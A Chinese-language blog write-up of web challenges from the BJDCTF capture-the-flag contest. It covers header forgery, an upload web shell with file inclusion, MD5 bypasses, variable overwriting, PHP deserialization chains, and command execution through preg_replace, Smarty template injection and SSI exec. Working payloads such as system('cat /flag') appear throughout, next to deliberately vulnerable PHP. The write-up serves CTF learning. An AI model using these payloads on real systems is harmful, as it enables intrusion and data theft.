---
layout: post
title: BJDCTF Web Writeup
data: 2020-01-17
categories: Writeups
tags: 
 - CTF
 - Writeup
description:
excerpt_separator: ""
---

# hello_world

## 解题思路

打开看着像一个用模板做的网站。第一步先看源码，发现只有一个可用的链接，指向文件search.php，打开返回`please make sure your id`，要求我检查id。

然后抓包检查，请求头没什么特别的，不过注意到search.php的返回头中有这样的内容：`id: guestZ3Vlc3Q=`，猜测可能需要发送类似的请求头，于是伪造admin发送。

这次返回`请使用主机访问`，伪造一个XFF试试。又返回`you are not from https://google.com`，那就再伪造Referer，于是获得了flag。

## 备注

作为第一道Web题，并没有很快地做出来。首先请求头也是一种和服务器交互的方式，然后看到非标准的响应头理应想到发出类似的请求。可能还是思路不够灵活，或者经验太少。

****

# easy_upload

## 解题思路

是个文件上传页面，检查过滤方式，只是要求文件MIME是jpg，不过会修改文件名为xxx.jpg，上传成功将返回文件路径。

上传木马，然后注意到url的内容：`index.php?action=upload.php`，文件包含。包含一下我们的木马，然后读文件/flag，获得flag。

## 备注

一道极为基础的文件上传和包含，然而还是过了好久才在别人的提示下恍然大悟。简单来讲就是忘记了url的内容，还是基本功不够熟练。

****

# Hidden secrets

## 解题思路

打开是个登录界面，不过似乎有个重定向，看到了一闪而过的flag。抓包看看，是个假flag，不过继续抓，会看到这样的响应头：`password: d0970714757783e6cf17b26fb8e2298f`，看着像个md5。那试试用这个密码登录，然后密码错误。再把这个md5解密一下，是112233，登录成功。

不过新跳转的页面说我还没有登录，应该是cookie的问题，查看一下发现cookie也是一个md5，那就把刚刚那个换上，就成功了，在源码中找到flag。

****

# easy_md5

## 解题思路

打开就一个输入框，抓包看看，有这样的响应头：`hint: select * from 'admin' where password=md5($pass,true)`，不多说了，提交ffifdyop。

在新返回的页面源码中找到这样的内容：

```html
<!--
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
	//wow,you can really dance
-->
```

md5+弱类型，或者提交数组，通过，又返回了一个源码：

```php
 <?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
} 
```

md5碰撞，或者再提交数组，获得flag。

## 备注

这次记住了，用提交数组的方式绕过md5检验。

****

# Mark loves cat

## 解题思路

源码和请求包都没啥线索，就扫个目录，发现有git源码泄漏，提取一下，index.php部分源码如下：

```php
<?php

include 'flag.php';

$yds = "dog";
$is = "cat";
$handsome = 'yds';

foreach($_POST as $x => $y){
    $$x = $y;
}

foreach($_GET as $x => $y){
    $$x = $$y;
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){
        exit($handsome);
    }
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}



echo "the flag is: ".$flag;
```

分析一下，首先要求POST或GET中必有一个名为flag的键，但是这样的话可变变量会覆盖掉真正的flag的值。但是注意到在GET的foreach中是两个可变变量进行赋值，第一个想法是提交这样的get参数：`flag=flag`。但是下面要求键和值不得同为flag，所以自然地引入一个临时变量，修改get参数为这样：`temp=flag&flag=temp`。不过又触发了过滤，即要求flag键的值不得为其它键名，有点难顶了。

后来突然想到可以直接将GET数组覆盖成字符串，这样就跳过了第三个foreach，使get参数为这样：`temp=flag&flag=temp&_GET=foo`。然而这样就引发了刚刚第一个提到的过滤。那正好利用一下POST，同时添加post参数为：`_POST[flag]=bar`。完事。

****

# 这序列化也太简单了吧

## 解题思路

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
//flag in /flag
class Flag{
    public $file;

    public function __wakeup(){
        $this -> file = 'woc';
    }

    public function __destruct(){
        print_r(file_get_contents($this -> file));
    }
}

$exp = $_GET['exp'];
$new = unserialize($exp);
```

构造个file属性为/flag的对象，序列化后修改成员属性绕过__wakeup()就结束了。

****

# ZJCTF，就这？

## 解题思路

又直接给了源码：

```php
<?php

error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];

if(strstr(file_get_contents('php://input'),'a')){
    die("嚯，有点意思");
}

if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```

用data协议传入"I have a dream"，然后php://filter获取next.php源码：

```php

```

这是一个grep_replace()命令执行漏洞，可以利用`\S*=${}`执行PHP函数，构造payload：`\S*=${getFlag()}&cmd=system('cat /flag');`，获得flag。

****

# The Mystery of IP

{% raw %}

## 解题思路

打开是个简单的网站，有个Flag按钮可以点，点击，新页面返回了我的IP。修改请求头，发现可以通过修改XFF的方式控制回显。

感觉可能是SSTI，提交{{7*7}}，返回了49，确实是SSTI。然后通过报错得知模板引擎是Smarty。

可以利用{if xxx()}{/if}执行PHP函数，于是构造payload：{if system("cat /flag")}{/if}，获得flag。

{% endraw %}

****

# easy_serialize

## 解题思路

有源码如下：

```php
<?php
header("Content-type:text/html;charset=utf-8");
error_reporting(1);

class Read 
{
    public function get_file($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}
class Show
{
    public $source;
    public $var;
    public $class1;
    public function __construct($name='index.php')
    {
        $this->source = $name;
        echo $this->source.' Welcome'."<br>";    
}
 
    public function __toString()
    {   
        $content = $this->class1->get_file($this->var);
        echo $content;
        return $content;
    }
 
    public function _show()
    {
        if(preg_match('/gopher|http|ftp|https|dict|\.\.|flag|file/i',$this->source)) {
            die('hacker');
        } else {
            highlight_file($this->source);
        }
 
    }
 
    public function Change()
    {
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
        }
    }
    public function __get($key){
        $function=$this->$key;
        $this->{$key}();
    }
}

if(isset($_GET['sid']))
{
    $sid=$_GET['sid'];
    $config=unserialize($_GET['config']);
    $config->$sid;
}
else
{
    $show = new Show('index.php');
    $show->_show();
}
```

首先看到Read的get_file()方法可以读文件，然后继续往下看，Show的__toString()方法会调用get_file()方法。这样的话只需要使Show对象被当作字符串执行就可以了。构造一个这样的对象：

```php
<?php
class Read {
}

class Show {
    public $source;
    public $var;
    public $class1;
}

$a = new Show();
$a->var = "flag.php";
$a->class1 = new Read();

$b = new Show();
$b->source = $a;

echo serialize($b);
?>
```

然后放到config，sid=Change，__get()方法会将它作为方法执行，然后base64解码得到flag。另外扫目录可以看到又flag.php文件。

****

# easy_search

## 解题思路

没有思路，那就扫目录，有vim源码泄漏：

```php
<?php
	ob_start();
	function get_hash(){
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
		$content = uniqid().$random;
		return sha1($content); 
	}
    header("Content-Type: text/html;charset=utf-8");
	***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
			***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
			echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";
            
    }else
    {
	***
    }
	***
?>

```

第一个对md5的检验，好像只能爆破，好在明文数字不是很大。然后会保存到shtml文件中，可能是个SSI注入，就是不清楚怎么获得文件路径，难道是爆破？

然后实际操作一下，说我的请求头错了，意识到响应头可能有信息。抓包看看，果然，是文件路径。然后访问stml文件，试试SSI注入，发现没什么过滤，直接用`<!--exec cmd="">`执行命令，获得flag。